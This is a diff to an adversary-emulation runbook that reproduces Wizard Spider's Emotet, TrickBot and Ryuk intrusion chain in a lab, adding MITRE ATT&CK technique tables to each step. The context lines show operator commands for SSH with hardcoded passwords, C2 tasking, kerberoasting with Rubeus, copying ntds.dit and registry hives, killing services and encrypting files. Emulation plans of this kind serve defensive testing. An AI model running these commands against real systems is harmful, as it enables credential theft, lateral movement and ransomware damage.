@@ -48,6 +48,15 @@ sshpass -p"Passw0rd!" ssh  judy@10.0.0.7 -oStrictHostkeyChecking=no 'powershell.
 ```bash
 sshpass -p"Passw0rd!" ssh  judy@10.0.0.7 -oStrictHostkeyChecking=no 'powershell.exe -Command "cscript.exe C:\\Users\\judy\\adb.vbs"'
 ```
+| TTP | Notes |
+| -------- | ------- |
+| T1078.002  | WizardSpider uses valid credentials. |
+| T1021.004   | WizardSpider uses SSH access the machine |
+| T1059.001    | WizardSpider uses powershell to execute code |
+| T1105   | WizardSpider uses HTTP to ingress files |
+| T1204.002   | WizardSpider executes malicious VBA macros. |
+|T1027.013 | WizardSpider encodes VBA code|
+| T1071.001 | WizardSpider uses HTTP for network communications. |
 
 ## Step 2 - Emotet Persistence
 
@@ -72,6 +81,10 @@ Copy/paste the command in your lower terminal tab:
 ```bash
 ./evalsC2client.py --set-task DOROTHY_DABB41A5 1
 ```
+| TTP | Notes |
+| -------- | ------- |
+| T1547.001  | WizardSpider uses registry keys to install persistance. |
+
 
 ## Step 3 - Emotet Host Discovery and Credential Collection
 
@@ -95,6 +108,10 @@ Enumerate processes.
 ```bash
 ./evalsC2client.py --set-task DESKTOP-9IA6T0M_BA673852 "read C:\\Users\\Public\\Documents\\donotshare.txt"
 ```
+| TTP | Notes |
+| -------- | ------- |
+| T1057  | WizardSpider does process discovery |
+| T1552.001  | WizardSpider scrapes credentials from local files |
 
 ## Step 4 - Move Laterally Deploy TrickBot
 
@@ -135,6 +152,12 @@ sshpass -pFall2021 scp -oStrictHostkeyChecking=no TrickBot/WNetval/TrickBotClien
 ```bash
 sshpass -pFall2021 ssh -oStrictHostkeyChecking=no bill@10.0.0.8 "C:\\Users\\bill\\uxtheme.exe"
 ```
+| TTP | Notes |
+| -------- | ------- |
+| T1078.002  | WizardSpider uses valid credentials. |
+| T1105 | WizardSpider uses SSH to ingress tools. |
+| T1059.003  | WizardSpider uses CMD to execute implants. |
+| T1571  | WizardSpider uses HTTP over a non-standard port for C2 communications. |
 
 ## Step 5 - TrickBot Discovery
 
@@ -183,6 +206,18 @@ From your C2 server tab, execute the following commands.
 ```bash
 ./evalsC2client.py --set-task TrickBot-Implant "whoami /groups"
 ```
+| TTP | Notes |
+| -------- | ------- |
+| T1041 | WizardSpider exfiltrates information over C2 channel |
+| T1082  | WizardSpider gathers victim host information |
+| T1007   | WizardSpider gathers system service information |
+| T1087.001  | WizardSpider collects user information |
+| T1087.002  | WizardSpider collects domain user information |
+| T1016  | WizardSpider gathers network information |
+| T1049   | WizardSpider gathers network connections information |
+| T1016 | WizardSpider gathers domain network configurations information |
+| T1482  | WizardSpider gathers domain trust information |
+| T1069.001  | WizardSpider gathers groups information |
 
 ## Step 6 - Kerberoast the DC
 
@@ -207,6 +242,11 @@ Wizard Spider cracks the credentials offline for use in the next step.
 ```bash
 ./evalsC2client.py --set-task TrickBot-Implant "rubeus.exe kerberoast /domain:oz.local"
 ```
+| TTP | Notes |
+| -------- | ------- |
+| T1105 | WizardSpider ingresses tools via HTTP |
+| T1558.003  | WizardSpider kerberoasts the domain |
+| T1110.002  | WizardSpider performs offline cracking of hashes |
 
 ## Step 7 - Lateral Movement to DC
 
@@ -255,6 +295,13 @@ jelly execute powershell.exe -Command 'Set-ItemProperty "HKCU:\Software\Microsof
 ```bash
 jelly execute adfind -f "(objectcategory=group)"
 ```
+| TTP | Notes |
+| -------- | ------- |
+| T1105 | WizardSpider uses SSH to ingress tools and execute code |
+| T1571  | WizardSpider uses HTTP over a non-standard port for C2 communications. |
+|  T1547.004  | WizardSpider establishes persistence by changing the Winlogon registry keys |
+| T1069.003 | WizardSpider enumerates domain groups and computers |
+|T1078.002 	| WizardSpider uses stolen domain admin credentials.|
 
 ## Step 8 - Dump Active Directory Database (ntds.dit)
 
@@ -293,6 +340,10 @@ jelly execute copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Syste
 ```bash
 jelly execute reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE
 ```
+| TTP | Notes |
+| -------- | ------- |
+| T1003.003  | WizardSpider creates a copy of the Active Directory domain database |
+| T1003.002  | WizardSpider creates a copy of the SAM database |
 
 ## Step 9 - Ryuk Inhibit System Recovery
 
@@ -327,6 +378,14 @@ jelly download path/to/window.bat C:\Users\Public\window.bat
 
 jelly execute C:\Users\Public\window.bat
 ```
+
+| TTP | Notes |
+| -------- | ------- |
+| T1021.002   | WizardSpider mounts the C$ share of a lateral host |
+| T1489  | WizardSpider stops services and processes|
+| T1222.001   | WizardSpider deletes access-based restrictions on files and directories. |
+| T1562.001  | WizardSpider kills services related to AV engines |
+| T1490 | WizardSpider deletes volume shadow copies. |
 
 ## Step 10 - Ryuk Encryption for Impact
 
@@ -370,3 +429,13 @@ jelly execute type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf
 # confirm encryption (remote)
 jelly execute type \\toto\C$\Users\Public\Documents\Whitepaper_ekFUNt.rtf
 ```
+| TTP | Notes |
+| -------- | ------- |
+|  T1134 | WizardSpider adjusts its token privileges to have the SeDebugPrivilege.|
+| T1057  | WizardSpider uses CreateToolhelp32Snapshot to enumerate all running processes.|
+| T1055.002   | WizardSpider injects remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.|
+| T1486  | WizardSpider uses symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.|
+| T1021.002   | WizardSpider encrypts the C$ network share.|
+|  T1016 | WizardSpider uses GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.|
+| 	T1083 |	WizardSpider enumerates files and folders on all mounted drives|
+|T1106| WizardSpider uses multiple native APIs including CreateRemoteThread for process injection.
